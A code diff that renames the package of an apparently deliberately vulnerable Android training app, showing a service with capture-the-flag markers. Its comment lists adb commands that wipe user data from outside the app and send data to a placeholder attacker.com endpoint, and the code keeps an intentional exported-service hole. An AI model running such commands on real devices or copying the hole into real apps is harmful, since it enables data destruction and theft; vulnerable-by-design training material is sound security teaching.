@@ -1,4 +1,4 @@
-package com.vulndroid.app.services;
+package com.gu3sswe4k.app.services;
 
 import android.app.Service;
 import android.content.Intent;
@@ -15,11 +15,11 @@ import android.util.Log;
  *
  * Attack vectors:
  *   # Trigger data wipe from outside the app
- *   adb shell am startservice -n com.vulndroid.app/.services.DataSyncService \
+ *   adb shell am startservice -n com.gu3sswe4k.app/.services.DataSyncService \
  *       --es "action" "wipe_user_data"
  *
  *   # Exfil data to attacker-controlled server
- *   adb shell am startservice -n com.vulndroid.app/.services.DataSyncService \
+ *   adb shell am startservice -n com.gu3sswe4k.app/.services.DataSyncService \
  *       --es "action" "sync" --es "endpoint" "http://attacker.com/collect"
  */
 public class DataSyncService extends Service {
@@ -39,7 +39,7 @@ public class DataSyncService extends Service {
         if ("wipe_user_data".equals(action)) {
             // VULN: Any external app can wipe user data
             getSharedPreferences("user_prefs", MODE_PRIVATE).edit().clear().apply();
-            com.vulndroid.app.FlagManager.capture(this, com.vulndroid.app.FlagManager.FLAG_SV_02A);
+            com.gu3sswe4k.app.FlagManager.capture(this, com.gu3sswe4k.app.FlagManager.FLAG_SV_02A);
         Log.d(TAG, "User data wiped by external trigger");
 
         } else if ("sync".equals(action) && endpoint != null) {
